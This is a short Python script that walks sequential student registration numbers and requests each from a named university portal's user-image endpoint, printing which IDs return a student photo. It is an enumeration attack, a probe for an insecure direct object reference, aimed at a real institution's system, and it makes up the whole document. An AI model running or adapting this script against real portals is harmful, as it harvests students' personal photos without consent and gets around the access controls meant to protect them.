import requests

# Registration number pattern: YYDDDNNNN
# Try sequential IDs for the same batch/dept
base_url = "https://vtop.vit.ac.in/vtop/users/image/?id="

for i in range(1, 10):
    reg_id = f"24BCE{i:04d}"
    url = base_url + reg_id
    r = requests.get(url)
    if r.status_code == 200 :
        print(f"[+] Valid student image found: {reg_id}")